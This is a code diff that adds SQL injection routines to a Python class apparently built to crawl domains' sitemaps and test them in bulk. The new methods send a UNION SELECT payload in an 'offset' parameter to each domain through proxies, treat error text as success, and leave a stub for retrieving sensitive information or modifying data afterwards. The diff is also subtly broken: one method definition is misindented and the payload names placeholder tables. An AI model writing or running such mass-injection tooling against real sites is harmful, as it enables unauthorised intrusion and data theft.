@@ -125,6 +125,39 @@ class SitemapSQLiTool:
         self.queue.join()
 
         logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")
+        def check_sqli_vulnerability(self, url, domain):
+        try:
+            # Customize the SQL payload to inject specific SQL statements
+            # and exploit the vulnerabilities you want to test
+            payload = "' UNION SELECT column1, column2 FROM table_name -- "
+            full_url = f"https://{domain}{url}?offset={payload}"
+            
+            response = requests.get(full_url, timeout=20, proxies=self.proxies)
+            
+            # Capture and analyze the responses to identify successful injections
+            if self.is_sqli_successful(response):
+                # Handle successful SQL injection
+                # Modify the logic based on your specific objectives
+                self.process_successful_sqli(url, domain)
+                
+        except requests.exceptions.RequestException as e:
+            logger.error(f"An error occurred while checking SQLi vulnerability for URL {url}: {e}")
+
+    def is_sqli_successful(self, response):
+        # Capture and analyze the responses to identify successful injections
+        # Look for specific patterns, error messages, or anomalies in the responses
+        # that indicate a successful SQL injection.
+        # Customize the logic based on your target application's responses
+        if "Error" in response.text or "SQL syntax" in response.text:
+            return True
+        return False
+
+    def process_successful_sqli(self, url, domain):
+        # Handle successful SQL injection
+        # Modify the logic based on your specific objectives
+        # Retrieve sensitive information, modify data, or perform any other actions
+        logger.info(f"Successful SQL injection detected for URL {url} in domain {domain}")
+        # Add your custom code here to perform actions for successful injection
 
     def parse_sitemap(self, domain):
         # Implement sitemap parsing here...
